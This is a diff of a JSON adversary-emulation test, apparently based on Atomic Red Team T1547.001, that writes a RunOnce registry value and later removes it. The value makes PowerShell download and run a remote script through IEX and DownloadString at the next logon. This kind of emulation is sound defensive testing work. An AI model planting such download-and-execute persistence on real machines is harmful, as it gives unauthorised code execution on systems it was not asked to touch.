@@ -7,52 +7,52 @@
   ],
   "steps": [
     {
-      "id": "cf386422-b90d-4606-85dd-a7739d6cc771",
+      "id": "32c2974d-7e56-47bf-a392-163e9a87478a",
       "type": "execute-command",
       "data": {
         "command": "$RunOnceKey = \"#{reg_key_path}\"\nset-itemproperty $RunOnceKey \"NextRun\" '#{thing_to_execute} \"IEX (New-Object Net.WebClient).DownloadString(`\"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\")\"'\n",
         "command_type": "powershell"
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "cca750a3-0387-4c96-b58b-1338af30c244",
+      "id": "649ee379-41ba-454c-b07b-03ebf1ba58d2",
       "type": "execute-command",
       "data": {
         "command": "Remove-ItemProperty -Path #{reg_key_path} -Name \"NextRun\" -Force -ErrorAction Ignore\n",
         "command_type": "powershell"
       },
-      "elevation_required": false
+      "elevation_required": true
     }
   ],
   "flows": [
     {
-      "s": "cf386422-b90d-4606-85dd-a7739d6cc771",
+      "s": "32c2974d-7e56-47bf-a392-163e9a87478a",
       "p": "on-success",
-      "o": "cca750a3-0387-4c96-b58b-1338af30c244"
+      "o": "649ee379-41ba-454c-b07b-03ebf1ba58d2"
     },
     {
-      "s": "cf386422-b90d-4606-85dd-a7739d6cc771",
+      "s": "32c2974d-7e56-47bf-a392-163e9a87478a",
       "p": "on-failure",
-      "o": "cca750a3-0387-4c96-b58b-1338af30c244"
+      "o": "649ee379-41ba-454c-b07b-03ebf1ba58d2"
     }
   ],
   "tags": [
-    "T1547.001",
-    "atomic-red-team"
+    "T1547",
+    "T1547.001"
   ],
   "input_arguments": [
-    {
-      "name": "thing_to_execute",
-      "type": "path",
-      "description": "Thing to Run",
-      "value": "powershell.exe"
-    },
     {
       "name": "reg_key_path",
       "type": "path",
       "description": "Path to registry key to update",
       "value": "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
+    },
+    {
+      "name": "thing_to_execute",
+      "type": "path",
+      "description": "Thing to Run",
+      "value": "powershell.exe"
     }
   ]
 }
